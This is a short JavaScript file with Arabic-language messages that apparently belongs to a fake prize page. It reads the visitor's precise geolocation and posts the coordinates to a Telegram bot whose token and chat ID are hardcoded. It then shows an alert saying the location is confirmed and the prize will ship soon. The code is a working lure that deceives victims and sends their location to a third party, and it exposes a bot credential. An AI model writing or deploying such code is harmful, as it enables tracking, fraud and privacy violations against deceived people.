function sendLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else {
    alert("المتصفح لا يدعم تحديد الموقع");
  }
}

function success(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const telegramToken = '7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0';
  const chatId = '6817512459';
  const message = `تم تأكيد موقع الشحن:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(response => {
    if (response.ok) {
      alert("تم تأكيد الموقع بنجاح، وسيتم شحن الجائزة قريبًا!");
    } else {
      alert("حدث خطأ أثناء إرسال الموقع.");
    }
  })
  .catch(error => {
    alert("فشل الاتصال بالخادم.");
    console.error(error);
  });
}

function error(err) {
  alert("لم نتمكن من تحديد موقعك. يرجى المحاولة مرة أخرى.");
}